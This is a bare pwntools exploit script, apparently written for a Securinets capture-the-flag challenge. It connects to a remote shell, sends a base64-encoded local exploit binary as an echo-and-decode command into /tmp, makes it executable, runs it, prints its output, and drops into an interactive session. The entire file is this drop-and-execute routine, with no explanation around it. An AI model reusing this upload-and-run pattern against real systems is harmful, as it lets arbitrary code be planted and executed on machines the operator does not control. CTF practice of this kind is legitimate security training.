from pwn import *
# 
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p = remote("pwn.ctf.securinets.tn",8888)

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)


ru(b"$ ")
with open("./exp_enc",'r') as f:
    res = f.read().replace("\n",'')
print(len(res))
# 
p.sendline(f"echo {res} | base64 -d > /tmp/exp".encode())
ru(b"$ ")
context.log_level='debug'
p.sendline(b"chmod +x /tmp/exp && /tmp/exp > /tmp/log && cat /tmp/log")
print(ru(b"$ "))
p.interactive()